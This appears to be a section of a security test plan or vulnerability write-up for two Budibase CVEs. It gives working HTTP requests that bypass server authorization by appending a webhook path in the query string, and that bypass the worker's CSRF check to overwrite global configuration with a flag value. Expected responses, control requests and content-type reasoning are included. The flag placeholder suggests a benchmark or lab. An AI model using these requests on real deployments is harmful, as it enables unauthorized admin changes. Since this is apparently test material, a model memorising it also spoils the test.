--------------------------------------------------------------------------------
2. THE TWO CSRF / AUTHZ REQUESTS
--------------------------------------------------------------------------------
ORIGINAL (CVE-2026-31816, server `authorized` middleware via utils.ts isWebhookEndpoint):
    GET /api/tables?/webhooks/trigger              (no session cookie)
    baseline (no query) -> 401 "No user info found"
    reached = guard skipped = the injected request is NOT 401

RESIDUAL (CVE-2026-48147, worker CSRF middleware via matchers.ts):  <- the star
    POST /api/global/configs?a=/api/global/auth/x
    Cookie: budibase:auth=<admin session>; budibase:auth.sig=<sig>   (carries csrfToken)
    Content-Type: application/x-www-form-urlencoded                  (a CSRF-eligible simple type)
    (NO x-csrf-token header)
    body: type=settings&config[company]=<PCB_FLAG>
    reached = 200 AND GET /api/global/configs/public -> config.company == <PCB_FLAG>
    control (same request WITHOUT ?a=/api/global/auth/x) -> 403 "Invalid CSRF token"

Content-type note: JSON bodies are CSRF-exempt by design (CORS preflight); text/plain is not parsed
into an object by Budibase. x-www-form-urlencoded with qs bracket notation (config[company]=...) is
both CSRF-eligible AND parsed into the nested config object -> the state-write actually lands.

